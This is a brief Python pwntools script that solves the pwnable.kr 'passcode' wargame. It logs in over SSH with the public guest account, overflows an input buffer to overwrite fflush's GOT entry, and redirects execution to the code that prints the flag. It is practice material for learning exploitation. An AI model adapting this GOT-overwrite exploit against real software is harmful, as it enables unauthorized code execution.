from pwn import *

context(arch='amd64', os='linux', log_level='error')

sh = ssh('passcode', 'pwnable.kr', password='guest', port=2222)

p = sh.process('passcode')


p.recv()
payload = b'A'*96
# fflush@got
payload += b'\x04\xa0\x04\x08'
p.sendline(payload)

p.recv()
# cat flag (decimal)
p.sendline(b'134514147')

flag = p.recv()
print(flag)

